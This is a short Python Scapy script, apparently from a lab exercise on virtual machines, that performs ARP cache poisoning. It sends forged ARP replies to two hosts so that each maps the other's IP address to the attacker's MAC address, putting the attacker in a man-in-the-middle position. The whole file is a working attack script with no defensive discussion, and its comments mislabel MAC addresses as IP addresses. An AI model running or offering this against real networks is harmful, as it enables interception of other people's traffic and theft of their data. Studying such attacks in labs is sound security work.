#!/usr/bin/python3
from scapy.all import *

# Sending to VM A
E = Ether(dst = '08:00:27:59:a3:c9', src = '08:00:27:17:de:fa')
# Mapping Attacker's MAC address (08:00:27:17:de:fa) with VM B's IP (08:00:27:70:0c:00) and sending to VM A's (08:00:27:59:a3:c9) ARP cache
A = ARP(
    hwsrc = '08:00:27:17:de:fa', psrc = '10.0.2.14',
    hwdst='08:00:27:59:a3:c9', pdst='10.0.2.13',
)
pkt = E/A
pkt.show()
sendp(pkt)

# Sending to VM B
E = Ether(dst = '08:00:27:70:0c:00', src = '08:00:27:17:de:fa')
# Mapping Attacker's MAC address (08:00:27:17:de:fa) with VM A's IP (08:00:27:59:a3:c9) and sending to VM B's (08:00:27:70:0c:00) ARP cache
A = ARP(
    hwsrc = '08:00:27:17:de:fa', psrc = '10.0.2.13',
    hwdst='08:00:27:70:0c:00', pdst='10.0.2.14',
)
pkt = E/A
pkt.show()
sendp(pkt)